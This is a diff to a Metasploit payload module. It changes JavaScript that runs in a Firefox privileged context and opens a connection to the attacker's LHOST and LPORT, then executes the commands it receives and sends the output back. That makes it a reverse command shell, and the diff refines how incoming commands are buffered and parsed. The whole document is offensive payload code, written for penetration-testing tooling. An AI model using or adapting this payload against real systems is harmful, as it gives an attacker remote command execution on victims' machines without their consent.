@@ -1,11 +1,12 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
@@ -31,6 +32,8 @@ module Metasploit3
     <<-EOS
 
       (function(){
+        window = this;
+
         Components.utils.import("resource://gre/modules/NetUtil.jsm");
         var host = '#{datastore["LHOST"]}';
         var port = #{datastore["LPORT"]};
@@ -45,15 +48,16 @@ module Metasploit3
                        .createInstance(Components.interfaces.nsIInputStreamPump);
         pump.init(inStream, -1, -1, 0, 0, true);
 
+        #{read_until_token_source}
+
         var listener = {
           onStartRequest: function(request, context) {},
           onStopRequest: function(request, context) {},
-          onDataAvailable: function(request, context, stream, offset, count) {
-            var data = NetUtil.readInputStreamToString(stream, count).trim();
+          onDataAvailable: readUntilToken(function(data) {
             runCmd(data, function(err, output) {
               if (!err) outStream.write(output, output.length);
             });
-          }
+          })
         };
 
         #{run_cmd_source}
@@ -63,4 +67,5 @@ module Metasploit3
 
     EOS
   end
+
 end
